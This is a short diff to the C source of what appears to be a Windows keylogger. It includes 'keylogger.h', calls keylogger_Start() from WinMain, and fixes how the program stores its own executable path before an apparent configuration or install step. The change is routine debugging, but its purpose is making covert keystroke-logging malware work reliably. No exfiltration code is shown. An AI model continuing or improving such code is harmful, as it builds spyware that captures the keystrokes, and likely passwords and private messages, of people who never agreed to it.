@@ -6,7 +6,7 @@
 #include "keylogger.h"
 #include "types.h"
 
-char* main_globalPath;
+char main_globalPath[256];
 
 char* main_nameGenerator(char* path)
 {
@@ -101,9 +101,13 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     if(strstr(GetCommandLine(), "-dontallow") == NULL)
     {
         srand(time(0));
-        main_globalPath = GetCommandLine();
-        main_config();    
-        free(main_globalPath);
+
+        if(GetModuleFileName(NULL, main_globalPath, 256))
+        {   
+            main_config(); 
+        }
+        
+        return 0;
     }
     
     keylogger_Start();
